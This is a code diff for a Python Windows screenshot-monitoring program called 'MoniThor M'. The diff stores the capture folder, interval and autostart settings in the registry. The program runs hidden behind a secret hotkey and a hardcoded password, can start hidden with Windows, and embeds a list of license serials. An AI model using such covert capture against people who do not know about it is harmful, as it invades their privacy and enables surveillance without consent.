@@ -13,6 +13,16 @@ import winreg as reg
 CONTRASENA_ACCESO = "6525"  
 COMBINACION_TECLAS = "ctrl+alt+m"  
 
+# --- RUTA POR DEFECTO ---
+CARPETA_DEFAULT = os.path.join(os.path.expanduser("~"), "Desktop", "Capturas")
+
+# --- CLAVES DEL REGISTRO ---
+REG_RUTA_BASE = r"Software\MoniThorM"
+REG_KEY_ACTIVADO = "Activado"
+REG_KEY_CARPETA = "CarpetaDestino"
+REG_KEY_INTERVALO = "IntervaloSegundos"
+REG_KEY_INICIO_AUTO = "InicioAutomatico"
+
 # --- LISTA DE 50 SERIALES VÁLIDOS ---
 SERIALES_VALIDOS = [
     "7xKqW2", "M9bVf1", "z4RnP8", "tG7mK5", "X2vYh9", "L6wBf3", "p8N1vG", "k4XmW9", "Z3vRj5", "H8fLq2",
@@ -25,8 +35,6 @@ SERIALES_VALIDOS = [
 class MonitorApp:
     def __init__(self):
         self.monitoreando = False
-        self.carpeta_destino = os.path.join(os.path.expanduser("~"), "Desktop", "Capturas")
-        self.intervalo_segundos = 10
         self.hilo_captura = None
         self.ventana_login = None  
         
@@ -37,6 +45,12 @@ class MonitorApp:
             "60 minutos": 3600, "120 minutos": 7200
         }
         
+        # Mapeo inverso para recuperar la etiqueta del OptionMenu
+        self.segundos_map = {v: k for k, v in self.tiempos_map.items()}
+
+        # Cargar configuraciones persistentes del registro al iniciar
+        self.cargar_configuraciones_registro()
+
         ctk.set_appearance_mode("dark")
         self.root = ctk.CTk()
         self.root.title("MoniThor M - Panel de Control")
@@ -50,16 +64,58 @@ class MonitorApp:
         if not self.verificar_activacion_local():
             self.pedir_serial_activacion()
         else:
-            # Si ya está activado anteriormente, arranca oculto normalmente
+            # Si ya está activado anteriormente, arranca oculto y escucha el atajo
             keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
             self.root.mainloop()
 
+    def cargar_configuraciones_registro(self):
+        """Carga las configuraciones guardadas en el registro de Windows"""
+        try:
+            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
+            
+            # Carpeta destino
+            try:
+                val_carpeta, _ = reg.QueryValueEx(clave, REG_KEY_CARPETA)
+                self.carpeta_destino = val_carpeta if val_carpeta else CARPETA_DEFAULT
+            except FileNotFoundError:
+                self.carpeta_destino = CARPETA_DEFAULT
+
+            # Intervalo en segundos
+            try:
+                val_intervalo, _ = reg.QueryValueEx(clave, REG_KEY_INTERVALO)
+                self.intervalo_segundos = int(val_intervalo) if val_intervalo else 10
+            except FileNotFoundError:
+                self.intervalo_segundos = 10
+
+            # Inicio automático
+            try:
+                val_inicio, _ = reg.QueryValueEx(clave, REG_KEY_INICIO_AUTO)
+                self.inicio_automatico = (val_inicio == "True")
+            except FileNotFoundError:
+                self.inicio_automatico = False
+
+            reg.CloseKey(clave)
+        except FileNotFoundError:
+            self.carpeta_destino = CARPETA_DEFAULT
+            self.intervalo_segundos = 10
+            self.inicio_automatico = False
+
+    def guardar_configuracion_individual(self, nombre_clave, valor):
+        """Guarda una clave y valor específico en el registro de Windows"""
+        try:
+            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE)
+            reg.SetValueEx(clave, nombre_clave, 0, reg.REG_SZ, str(valor))
+            reg.CloseKey(clave)
+            return True
+        except Exception as e:
+            print(f"Error guardando en registro ({nombre_clave}): {e}")
+            return False
+
     def verificar_activacion_local(self):
         """Verifica en el registro de Windows si el programa ya fue activado en esta PC"""
-        ruta_registro = r"Software\MoniThorM"
         try:
-            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, ruta_registro, 0, reg.KEY_READ)
-            valor, _ = reg.QueryValueEx(clave, "Activado")
+            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
+            valor, _ = reg.QueryValueEx(clave, REG_KEY_ACTIVADO)
             reg.CloseKey(clave)
             return valor == "True"
         except FileNotFoundError:
@@ -67,25 +123,16 @@ class MonitorApp:
 
     def guardar_activacion_local(self):
         """Guarda de forma permanente la marca de activación en el registro de Windows"""
-        ruta_registro = r"Software\MoniThorM"
-        try:
-            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, ruta_registro)
-            reg.SetValueEx(clave, "Activado", 0, reg.REG_SZ, "True")
-            reg.CloseKey(clave)
-            return True
-        except Exception as e:
-            messagebox.showerror("Error", f"No se pudo guardar la activación en el sistema: {e}")
-            return False
+        return self.guardar_configuracion_individual(REG_KEY_ACTIVADO, "True")
 
     def pedir_serial_activacion(self):
-        """Muestra una ventana obligatoria para ingresar el número de serie en el primer inicio"""
+        """Muestra una ventana obligatoria para ingresar el número de serie si no está activado"""
         self.ventana_serial = ctk.CTkToplevel(self.root)
         self.ventana_serial.title("Activación de Licencia")
         self.ventana_serial.geometry("400x220")
         self.ventana_serial.resizable(False, False)
         self.ventana_serial.attributes("-topmost", True)
         
-        # Evitar que cierren la ventana desde la X sin activar
         self.ventana_serial.protocol("WM_DELETE_WINDOW", lambda: sys.exit())
 
         lbl_info = ctk.CTkLabel(self.ventana_serial, text="MoniThor M - Licencia Requerida", font=("Arial", 16, "bold"))
@@ -110,8 +157,6 @@ class MonitorApp:
             if self.guardar_activacion_local():
                 messagebox.showinfo("Éxito", "Software activado correctamente de forma permanente.")
                 self.ventana_serial.destroy()
-                
-                # Habilitar el atajo de teclado para el uso normal del programa ahora que está validado
                 keyboard.add_hotkey(COMBINACION_TECLAS, self.mostrar_ventana_autenticacion)
             else:
                 sys.exit()
@@ -145,7 +190,10 @@ class MonitorApp:
         lbl_tiempo.pack(anchor="w", padx=20, pady=(10, 2))
         
         self.combo_tiempo = ctk.CTkOptionMenu(self.tabview.tab("Configuración"), values=list(self.tiempos_map.keys()), command=self.cambiar_tiempo)
-        self.combo_tiempo.set("10 segundos")
+        
+        # Seleccionar en la interfaz el valor cargado del registro
+        etiqueta_actual = self.segundos_map.get(self.intervalo_segundos, "10 segundos")
+        self.combo_tiempo.set(etiqueta_actual)
         self.combo_tiempo.pack(fill="x", padx=20, pady=5)
 
         lbl_ruta = ctk.CTkLabel(self.tabview.tab("Configuración"), text="Carpeta de destino para las imágenes:", font=("Arial", 13, "bold"))
@@ -162,6 +210,8 @@ class MonitorApp:
         btn_buscar.pack(side="right", padx=5)
 
         self.check_inicio = ctk.CTkCheckBox(self.tabview.tab("Configuración"), text="Iniciar de forma oculta con Windows")
+        if self.inicio_automatico:
+            self.check_inicio.select()
         self.check_inicio.pack(pady=20)
         self.check_inicio.configure(command=self.configurar_inicio_automatico)
 
@@ -175,7 +225,7 @@ class MonitorApp:
             f"Programa: MoniThor M\n"
             f"Descripción: Software de monitoreo laboral en Python que realiza capturas de pantalla automáticas cada cierto tiempo.\n\n"
             f"Creador: Attack7710 - Desarrollador\n"
-            f"Versión: V1.0\n"
+            f"Versión: V1.4\n"
             f"Ubicación: Bolivia\n"
             f"Contacto: +591 69856525\n"
             f"Fecha: {fecha_hoy}"
@@ -224,19 +274,25 @@ class MonitorApp:
             self.carpeta_destino = carpeta
             self.entry_carpeta.delete(0, "end")
             self.entry_carpeta.insert(0, carpeta)
+            # Guardado automático de la carpeta en el registro
+            self.guardar_configuracion_individual(REG_KEY_CARPETA, carpeta)
 
     def cambiar_tiempo(self, valor_seleccionado):
         self.intervalo_segundos = self.tiempos_map[valor_seleccionado]
+        # Guardado automático del intervalo en el registro
+        self.guardar_configuracion_individual(REG_KEY_INTERVALO, self.intervalo_segundos)
 
     def alternar_monitoreo(self):
         if not self.monitoreando:
             self.carpeta_destino = self.entry_carpeta.get()
+            self.guardar_configuracion_individual(REG_KEY_CARPETA, self.carpeta_destino)
+            
             if not os.path.exists(self.carpeta_destino):
                 try:
                     os.makedirs(self.carpeta_destino)
                 except Exception as e:
                     messagebox.showerror("Error", f"No se pudo crear la carpeta: {e}")
-                return
+                    return
             self.monitoreando = True
             self.lbl_estado.configure(text="ESTADO: MONITOREANDO", text_color="green")
             self.btn_inicio.configure(text="Detener Monitoreo", fg_color="red", hover_color="darkred")
@@ -263,8 +319,12 @@ class MonitorApp:
         ruta_script = os.path.abspath(sys.argv[0])
         try:
             clave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_ruta, 0, reg.KEY_SET_VALUE)
-            if self.check_inicio.get() == 1:
-                # Comprobar si se ejecuta como .exe o .py para escribir la ruta correcta de arranque
+            is_checked = (self.check_inicio.get() == 1)
+            
+            # Guardar estado en el registro de la app
+            self.guardar_configuracion_individual(REG_KEY_INICIO_AUTO, str(is_checked))
+
+            if is_checked:
                 if ruta_script.endswith('.exe'):
                     reg.SetValueEx(clave, nombre_app, 0, reg.REG_SZ, f'"{ruta_script}"')
                 else:
@@ -276,7 +336,7 @@ class MonitorApp:
                     messagebox.showinfo("Inicio Automático", "Removido con éxito.")
                 except FileNotFoundError:
                     pass
-                reg.CloseKey(clave)
+            reg.CloseKey(clave)
         except Exception as e:
             messagebox.showerror("Error", f"Error de registro: {e}")
 
